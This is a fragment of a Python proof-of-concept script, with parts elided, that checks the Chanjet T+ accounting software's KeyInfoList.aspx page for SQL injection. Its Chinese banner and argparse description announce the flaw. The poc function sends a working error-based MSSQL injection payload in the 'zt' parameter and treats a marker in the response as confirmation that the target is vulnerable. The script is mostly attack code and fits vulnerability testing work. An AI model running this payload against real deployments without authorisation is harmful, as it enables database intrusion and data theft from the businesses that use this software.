...
def banner():
    test = """畅捷通TPlus-KeylnfoList.aspx存在SQL注入"""
    print(test)
def main():
    banner()
    parser = argparse.ArgumentParser(description='畅捷通TPlus-KeylnfoList.aspx存在SQL注入漏洞')
...
def poc(target):
    payload = "/tplus/UFAQD/KeyInfoList.aspx?preload=1&zt=')AND+1+IN+(SELECT+sys.fn_varbintohexstr(hashbytes('MD5','1')))--+ "
    headers = {
    ...
    try:
        ...
        if response.status_code == 200 and "<script  type='text/javascript'>" in response.text:
